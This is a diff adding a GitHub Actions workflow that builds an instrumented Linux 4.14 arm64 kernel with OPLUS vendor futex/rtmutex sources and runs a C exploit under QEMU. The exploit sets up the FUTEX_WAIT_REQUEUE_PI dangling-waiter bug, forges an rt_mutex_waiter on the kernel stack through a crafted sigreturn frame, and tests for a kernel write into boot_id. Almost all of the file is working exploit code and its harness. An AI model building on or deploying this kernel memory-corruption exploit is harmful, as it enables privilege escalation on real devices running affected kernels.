@@ -1,0 +1,476 @@
+name: qemu-ghostlock-v13
+
+on:
+  workflow_dispatch:
+    inputs:
+      pad:
+        description: 'pad bytes in futex_wait_requeue_pi before rt_waiter (0 = none)'
+        required: false
+        default: '0'
+      shift:
+        description: 'override word shift (empty = auto-measure then dance)'
+        required: false
+        default: ''
+
+jobs:
+  qemu-ghostlock:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Checkout OPLUS futex sources (sparse)
+        uses: actions/checkout@v4
+        with:
+          sparse-checkout: |
+            kernel/futex.c
+            kernel/locking/rtmutex.c
+            kernel/locking/rtmutex_common.h
+          sparse-checkout-cone-mode: false
+
+      - name: Fetch generic 4.14.186
+        run: |
+          curl -sL https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.14.186.tar.xz -o k.tar.xz
+          tar xJf k.tar.xz
+          mv linux-4.14.186 linux-g
+
+      - name: Swap in OPLUS futex/rtmutex
+        run: |
+          cp kernel/futex.c linux-g/kernel/futex.c
+          cp kernel/locking/rtmutex.c linux-g/kernel/locking/rtmutex.c
+          cp kernel/locking/rtmutex_common.h linux-g/kernel/locking/rtmutex_common.h
+          echo "swap markers:"
+          grep -c "rt_mutex_start_proxy_lock" linux-g/kernel/futex.c linux-g/kernel/locking/rtmutex.c
+
+      - name: Instrument kernel (anchors + ghost delta + fpsimd capture)
+        env:
+          GHOSTPAD: ${{ github.event.inputs.pad || '0' }}
+        run: |
+          python3 << 'PYEOF'
+          import os
+          # 1) globalize boot_id buffer
+          boot_name = None
+          target_file = None
+          for fn in ('linux-g/drivers/char/random.c', 'linux-g/kernel/random.c', 'linux-g/kernel/sysctl.c'):
+              try:
+                  s = open(fn).read()
+              except IOError:
+                  continue
+              for cand in ('sysctl_bootid', 'boot_id'):
+                  for typ in ('static char %s', 'static unsigned char %s'):
+                      decl = typ % cand
+                      if decl in s:
+                          boot_name = cand
+                          target_file = fn
+                          s = s.replace(decl, 'unsigned char ghostlock_bootid_%s' % cand)
+                          s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
+                          if 'ghostlock_scratch' not in s:
+                              s += '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n'
+                              s += 'unsigned long ghostlock_fakelock[8] __attribute__((aligned(64)));\n'
+                          open(fn, 'w').write(s)
+                          break
+                  if boot_name:
+                      break
+              if boot_name:
+                  break
+          assert boot_name, 'boot_id buffer not found'
+          print('boot buffer:', boot_name, 'in', target_file)
+
+          # 2) rt_waiter capture in futex_wait_requeue_pi
+          f = open('linux-g/kernel/futex.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in f:
+              fidx = f.find('#include')
+              feol = f.find('\n', fidx)
+              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\nextern unsigned long ghostlock_fakelock[8];\n' + f[feol+1:]
+          needle = 'struct rt_mutex_waiter rt_waiter;'
+          cnt = f.count(needle)
+          if cnt >= 2:
+              idx = f.rfind(needle)
+              pad = int(os.environ.get('GHOSTPAD', '0'))
+              cap = ("\n\tpr_info(\"DBG rt_waiter=%px\\n\", &rt_waiter);\n"
+                     "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;\n"
+                     "\tmemset(ghostlock_fakelock, 0, sizeof(ghostlock_fakelock));\n"
+                     "\tghostlock_fakelock[1] = (unsigned long)&rt_waiter;\n"
+                     "\tghostlock_fakelock[2] = (unsigned long)&rt_waiter;\n"
+                     "\tghostlock_fakelock[3] = (unsigned long)&init_task;")
+              f = f[:idx+len(needle)] + cap + f[idx+len(needle):]
+              print('futex.c rt_waiter capture OK (decls=%d)' % cnt)
+          else:
+              print('futex.c rt_waiter capture WARN: needle missing')
+          open('linux-g/kernel/futex.c','w').write(f)
+
+          # 3) fpsimd.vregs capture in restore_fpsimd_context (arm64 signal.c)
+          #    打印 fpsimd.vregs 地址 = sigreturn 拷贝目标 sp，用于测距
+          g = open('linux-g/arch/arm64/kernel/signal.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in g:
+              gidx = g.find('#include')
+              geol = g.find('\n', gidx)
+              g = g[:geol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + g[geol+1:]
+          cap_needle = 'err = __copy_from_user(fpsimd.vregs, ctx->vregs,'
+          if cap_needle in g and 'DBG fpsimd_vregs' not in g:
+              cap = ('pr_info("DBG fpsimd_vregs=%px len=%ld\\n", fpsimd.vregs, (long)sizeof(fpsimd.vregs));\n\t'
+                     'ghostlock_scratch[2] = (unsigned long)fpsimd.vregs;\n\t'
+                     + cap_needle)
+              g = g.replace(cap_needle, cap, 1)
+              open('linux-g/arch/arm64/kernel/signal.c','w').write(g)
+              print('signal.c fpsimd_vregs capture OK')
+          else:
+              print('signal.c fpsimd capture WARN: needle missing or already present')
+
+          # 4) proxy lock + requeue markers
+          reps = [
+            ('return ret ? ret : task_count;',
+             'pr_info("FUTEX-DBG requeue-end ret=%d task_count=%d\\n", ret, task_count);\n\treturn ret ? ret : task_count;'),
+            ('ret = rt_mutex_start_proxy_lock(',
+             'pr_info("FUTEX-DBG proxy_lock call\\n");\n\t\t\tret = rt_mutex_start_proxy_lock('),
+          ]
+          for a, b in reps:
+              if a in f and b.split('\n')[0] not in f:
+                  f = f.replace(a, b)
+          open('linux-g/kernel/futex.c','w').write(f)
+          print('futex instrumentation done')
+
+          import subprocess
+          print('--- injected signal.c ---')
+          subprocess.run(['grep', '-n', 'DBG fpsimd_vregs', 'linux-g/arch/arm64/kernel/signal.c'])
+          print('--- injected futex.c ---')
+          subprocess.run(['grep', '-n', 'ghostlock_scratch', 'linux-g/kernel/futex.c'])
+          PYEOF
+
+      - name: Install cross toolchain + qemu
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq gcc-aarch64-linux-gnu qemu-system-aarch64 cpio
+
+      - name: Configure and build kernel
+        run: |
+          cd linux-g
+          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
+          scripts/config --enable CONFIG_FUTEX_PI
+          scripts/config --enable CONFIG_RT_MUTEXES
+          scripts/config --enable CONFIG_BLK_DEV_INITRD
+          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
+          make -j$(nproc) ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- Image > kbuild.log 2>&1 || {
+            echo "=== BUILD FAILED, errors: ==="
+            grep -E "error:|undefined reference" kbuild.log | head -30
+            exit 1
+          }
+          echo "=== build OK ==="
+          tail -3 kbuild.log
+          ls -la arch/arm64/boot/Image
+          grep -E " init_task$" System.map
+          grep -E "ghostlock_bootid|ghostlock_scratch|ghostlock_fakelock" System.map
+
+      - name: Build static repro and init
+        run: |
+          cd linux-g
+          INIT_TASK=$(grep ' init_task$' System.map | awk '{print $1}')
+          BOOT_ID=$(grep 'ghostlock_bootid' System.map | awk '{print $1}')
+          SCRATCH=$(grep 'ghostlock_scratch' System.map | awk '{print $1}')
+          FAKELOCK=$(grep 'ghostlock_fakelock' System.map | awk '{print $1}')
+          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH FAKELOCK=$FAKELOCK"
+          mkdir -p ../initramfs/proc ../initramfs/dev ../initramfs/sys
+          SHIFT_OVR="${{ github.event.inputs.shift }}"
+          if [ -n "$SHIFT_OVR" ]; then EXTRA="-DSHIFT_OVERRIDE=$SHIFT_OVR"; else EXTRA=""; fi
+          echo "SHIFT_OVR=$SHIFT_OVR EXTRA=$EXTRA"
+          cat > ../initramfs/repro.c << EOF
+          #define _GNU_SOURCE
+          #include <stdio.h>
+          #include <stdint.h>
+          #include <string.h>
+          #include <errno.h>
+          #include <unistd.h>
+          #include <pthread.h>
+          #include <sys/syscall.h>
+          #include <linux/futex.h>
+          #include <linux/sched.h>
+          #include <sys/select.h>
+          #include <sys/syslog.h>
+          #include <time.h>
+          #include <fcntl.h>
+          #include <stdlib.h>
+          #include <signal.h>
+          #include <setjmp.h>
+
+          #define ANCHOR_COMM   (0x${INIT_TASK}ULL + 0x7e0)
+          #define ANCHOR_BOOTID  0x${BOOT_ID}ULL
+          #define ANCHOR_INIT    0x${INIT_TASK}ULL
+          #define ANCHOR_SCRATCH 0x${SCRATCH}ULL
+          #define ANCHOR_FAKELOCK 0x${FAKELOCK}ULL
+
+          struct sched_attr_x {
+            uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
+            int32_t sched_nice; uint32_t sched_priority;
+            uint64_t sched_runtime; uint64_t sched_deadline; uint64_t sched_period;
+          };
+
+          /* aarch64 4.14.186 rt_sigframe 关键偏移（offsetof 实测，host LP64 == aarch64）：
+           *   offsetof(rt_sigframe, uc) = 128 (siginfo)
+           *   offsetof(ucontext, uc_mcontext) = 176
+           *   offsetof(sigcontext, __reserved) = 288
+           *   => fpsimd_context 起点 = 128+176+288 = 592 = 0x250
+           *   => fpsimd_context.vregs 起点 = 0x250 + 0x10 = 0x260
+           *   用纯字节缓冲 + 固定偏移构造，避免嵌套结构对齐歧义 */
+          #define FPSIMD_MAGIC 0x46508001
+          #define SF_FPSIMD_OFF   0x250   /* fpsimd_context.head 在 sigframe 里的字节偏移 */
+          #define SF_VREGS_OFF    0x260   /* fpsimd_context.vregs 在 sigframe 里的字节偏移 */
+
+          static long futex(uint32_t *uaddr, int op, uint32_t val,
+                            const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
+            return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
+          }
+          static uint32_t f_wait[8], f_pi_target[8], f_pi_chain[8];
+          static volatile int owner_has_target, waiter_has_chain, waiter_waiting,
+                             owner_started, route_done, owner_chain_done,
+                             ghost_go, consumer_done;
+          static volatile int waiter_tid, word_shift, dance_idx;
+
+          static void read_bootid(unsigned char out[16]) {
+            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+            memset(out, 0, 16);
+            if (fd >= 0) { char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1);
+              if (n > 0) { buf[n] = 0; unsigned char raw[16]; int nib=-1, o=0;
+                for (ssize_t i=0; i<n && o<16; i++) { int v;
+                  char c=buf[i];
+                  v = (c>='0'&&c<='9')?c-'0':(c>='a'&&c<='f')?c-'a'+10:(c>='A'&&c<='F')?c-'A'+10:-1;
+                  if (v<0) continue; if (nib<0){nib=v;continue;} raw[o++]=(unsigned char)((nib<<4)|v); nib=-1; }
+                if (o==16) memcpy(out, raw, 16); }
+              close(fd); }
+          }
+
+          static void *consumer_fn(void *a) {
+            while (!ghost_go) usleep(1000);
+            usleep(100000);
+            for (int i = 0; i < 20 && !consumer_done; i++) {
+              struct sched_attr_x attr;
+              memset(&attr, 0, sizeof(attr));
+              attr.size = sizeof(attr);
+              attr.sched_policy = SCHED_BATCH;
+              attr.sched_nice = (i % 19) + 1;
+              long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
+              printf("REPRO consumer sched_setattr i=%d tid=%d ret=%ld errno=%d idx=%d\n", i, waiter_tid, r, errno, dance_idx);
+              usleep(10000);
+            }
+            consumer_done = 1;
+            return NULL;
+          }
+
+          /* 构造 rt_sigframe：在偏移 0x250 放 fpsimd_context，vregs(512B @0x260) = 伪造 waiter */
+          static void build_sigframe(unsigned char *sf, int ws) {
+            memset(sf, 0, 0x1000);
+            /* fpsimd_context.head：magic + size */
+            uint32_t *head = (uint32_t *)(sf + SF_FPSIMD_OFF);
+            head[0] = FPSIMD_MAGIC;
+            head[1] = 0x210;             /* sizeof(struct fpsimd_context) = 528 */
+            /* vregs 512B 填伪造 waiter：字段字偏移 = ws + field_word */
+            uint64_t *v = (uint64_t *)(sf + SF_VREGS_OFF);
+            memset(v, 0, 512);
+            /* WIKO rt_mutex_waiter 80B：task@word6 lock@word7 prio@word8 deadline@word9 */
+            v[ws+0] = ANCHOR_COMM;   /* tree_pc */
+            v[ws+1] = 0;             /* tree_right */
+            v[ws+2] = ANCHOR_BOOTID; /* tree_left */
+            v[ws+3] = ANCHOR_COMM;   /* pi_pc */
+            v[ws+4] = 0;             /* pi_right */
+            v[ws+5] = ANCHOR_BOOTID; /* pi_left */
+            v[ws+6] = ANCHOR_INIT;   /* task */
+            v[ws+7] = ANCHOR_FAKELOCK;/* lock */
+            v[ws+8] = 130;           /* prio */
+            v[ws+9] = 0;             /* deadline */
+          }
+
+          /* sigreturn 栈回收：rt_sigreturn 触发 restore_fpsimd_context 拷贝
+           * aarch64 约定：sys_rt_sigreturn 用 regs->sp 作 sigframe 指针（非 syscall 参数）,
+           * 故用 mov sp,sf; svc #0 调（__NR_rt_sigreturn = 139） */
+          static void do_ghost_sigreturn(void) {
+            unsigned char *sf = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
+                                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            if (sf == MAP_FAILED) { perror("mmap"); _exit(1); }
+            build_sigframe(sf, word_shift);
+            printf("REPRO sigreturn enter shift=%d idx=%d sf=%p\n", word_shift, dance_idx, (void*)sf);
+            ghost_go = 1;
+            /* mov sp,sf; mov x8,#139; svc #0 —— 内核 parse sigframe 触发
+               restore_fpsimd_context 拷贝 vregs(512B) 到内核栈，之后 restore 寄存器跳走 */
+            register unsigned long x8 asm("x8") = 139;
+            asm volatile("mov sp, %0\n\t"
+                         "svc #0\n\t"
+                         :: "r"(sf), "r"(x8) : "memory");
+            printf("REPRO sigreturn returned (unexpected)\n");
+            _exit(0);
+          }
+
+          static void *waiter_fn(void *a) {
+            int idx = dance_idx;
+            waiter_tid = (int)syscall(SYS_gettid);
+            long r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); waiter_has_chain = 1;
+            while (!owner_has_target) usleep(1000);
+            __sync_synchronize(); waiter_waiting = 1;
+            struct timespec ts;
+            clock_gettime(CLOCK_MONOTONIC, &ts);
+            ts.tv_sec += 10;
+            r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
+            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            do_ghost_sigreturn();
+            while (!owner_chain_done) usleep(1000);
+            for (;;) sleep(60);
+            return NULL;
+          }
+
+          static void *owner_fn(void *a) {
+            int idx = dance_idx;
+            long r = futex(&f_pi_target[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI target ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); owner_has_target = 1;
+            while (!waiter_has_chain) usleep(1000);
+            __sync_synchronize(); owner_started = 1;
+            r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); owner_chain_done = 1;
+            for (;;) sleep(60);
+            return NULL;
+          }
+
+          static long run_dance(int idx, int shift) {
+            word_shift = shift;
+            dance_idx = idx;
+            owner_has_target = waiter_has_chain = waiter_waiting = 0;
+            owner_started = route_done = owner_chain_done = 0;
+            ghost_go = consumer_done = 0;
+            pthread_t o, w, c;
+            pthread_create(&o, NULL, owner_fn, NULL);
+            usleep(200000);
+            pthread_create(&w, NULL, waiter_fn, NULL);
+            pthread_create(&c, NULL, consumer_fn, NULL);
+            while (!waiter_waiting || !owner_started) usleep(1000);
+            usleep(100000);
+            long rq = -1; int edeadlk = 0;
+            for (int i = 1; i <= 3; i++) {
+              errno = 0;
+              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)0x7fffffff, &f_pi_target[idx], 0);
+              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d idx=%d\n", i, rq, errno, idx);
+              if (errno == 35) { edeadlk = 1; break; }
+              if (rq >= 1) break;
+              sleep(1);
+            }
+            sleep(2);
+            return edeadlk ? 35 : rq;
+          }
+
+          static void find_delta(unsigned long *qwaiter, unsigned long *fpsimd, long *pshift) {
+            *qwaiter = *fpsimd = 0; *pshift = 0;
+            const size_t cap = 1 << 20;
+            char *buf = malloc(cap);
+            if (!buf) { printf("REPRO malloc fail\n"); return; }
+            long n = syscall(SYS_syslog, 3, buf, (int)cap);
+            if (n <= 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
+            buf[n] = 0;
+            char *p = buf;
+            while ((p = strstr(p, "DBG rt_waiter=")) != NULL) {
+              *qwaiter = strtoull(p + 14, NULL, 16);
+              p += 14;
+            }
+            p = buf;
+            while ((p = strstr(p, "DBG fpsimd_vregs=")) != NULL) {
+              *fpsimd = strtoull(p + 17, NULL, 16);
+              p += 17;
+            }
+            printf("REPRO delta parse q_waiter=%016lx fpsimd_vregs=%016lx klog_bytes=%ld\n",
+                   *qwaiter, *fpsimd, n);
+            if (*qwaiter && *fpsimd) {
+              long delta = (long)(*qwaiter - *fpsimd);
+              *pshift = delta / 8;
+              printf("REPRO delta=%ld words=%ld\n", delta, *pshift);
+            }
+            if (!*qwaiter || !*fpsimd) {
+              printf("REPRO klog tail: %.600s\n", buf + (n > 600 ? n - 600 : 0));
+            }
+            free(buf);
+          }
+
+          int main(void) {
+            unsigned char before[16], after[16];
+            read_bootid(before);
+            printf("REPRO bootid before: %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
+                   before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
+                   before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);
+
+            /* measure：先跑一次 dance 触发 rt_waiter + fpsimd 打印，测 delta */
+            printf("REPRO measure dance (shift=0)\n");
+            run_dance(1, 0);
+            unsigned long qwaiter = 0, fpsimd = 0; long pshift = 0;
+            find_delta(&qwaiter, &fpsimd, &pshift);
+            printf("REPRO measure: q_waiter=%016lx fpsimd=%016lx shift=%ld\n", qwaiter, fpsimd, pshift);
+
+            /* dance：用实测 shift（或 override）枚举尝试 leak */
+            #ifdef SHIFT_OVERRIDE
+            int shifts[] = { SHIFT_OVERRIDE };
+            #else
+            int shifts[] = { (int)pshift, (int)pshift+1, (int)pshift-1,
+                             (int)pshift+2, (int)pshift-2 };
+            #endif
+            int ns = sizeof(shifts)/sizeof(shifts[0]);
+            printf("REPRO enumerate %d shift(s), first=%d\n", ns, shifts[0]);
+
+            for (int si = 0; si < ns; si++) {
+              int shift = shifts[si];
+              read_bootid(before);
+              printf("REPRO === try shift=%d idx=%d ===\n", shift, 2+si);
+              run_dance(2 + si, shift);
+              read_bootid(after);
+              printf("REPRO shift=%d bootid after %02x%02x%02x%02x%02x%02x%02x%02x\n",
+                     shift, after[0],after[1],after[2],after[3],after[4],after[5],after[6],after[7]);
+              unsigned long long leaked = 0;
+              for (int i = 0; i < 8; i++) leaked |= (unsigned long long)after[i] << (i*8);
+              printf("REPRO shift=%d leaked=%016llx expect_comm=%016llx\n", shift, leaked, (unsigned long long)ANCHOR_COMM);
+              if (leaked == (unsigned long long)ANCHOR_COMM) {
+                printf("REPRO SUCCESS shift=%d\n", shift);
+                return 0;
+              }
+            }
+            printf("REPRO all shifts done, no leak\n");
+            return 1;
+          }
+          EOF
+          aarch64-linux-gnu-gcc -static -O2 -pthread $EXTRA ../initramfs/repro.c -o ../initramfs/repro
+          cat > ../initramfs/init.c << 'EOF2'
+          #include <sys/syscall.h>
+          #include <sys/mount.h>
+          #include <sys/reboot.h>
+          #include <sys/stat.h>
+          #include <unistd.h>
+          #include <stdio.h>
+          int main(void) {
+            mkdir("/proc", 0755); mkdir("/dev", 0755); mkdir("/sys", 0755);
+            syscall(SYS_mount, "proc", "/proc", "proc", 0, 0);
+            syscall(SYS_mount, "devtmpfs", "/dev", "devtmpfs", 0, 0);
+            syscall(SYS_mount, "sysfs", "/sys", "sysfs", 0, 0);
+            printf("=== QEMU ghostlock v13 start ===\n");
+            fflush(stdout);
+            execl("/repro", "repro", NULL);
+            printf("exec failed\n");
+            syscall(SYS_reboot, 0xfee1dead, 672274793, 0x4321fedc, NULL);
+            return 0;
+          }
+          EOF2
+          aarch64-linux-gnu-gcc -static -O2 ../initramfs/init.c -o ../initramfs/init
+          cd ../initramfs && find . | cpio -o -H newc | gzip > ../initramfs.cpio.gz
+          ls -la ../initramfs.cpio.gz
+
+      - name: Run QEMU test
+        timeout-minutes: 6
+        run: |
+          timeout 240 qemu-system-aarch64 \
+            -M virt -cpu cortex-a57 -m 512M -smp 4 -nographic -no-reboot \
+            -kernel linux-g/arch/arm64/boot/Image \
+            -initrd initramfs.cpio.gz \
+            -append "console=ttyAMA0 earlycon rdinit=/init" > qemu.log 2>&1 || true
+          echo "=== QEMU log (REPRO + DBG) ==="
+          grep -E "REPRO|DBG|FUTEX-DBG" qemu.log | head -100
+          echo "=== TAIL ==="
+          tail -20 qemu.log
+
+      - name: Upload QEMU log
+        uses: actions/upload-artifact@v4
+        with:
+          name: qemu-ghostlock-v13-log
+          path: qemu.log
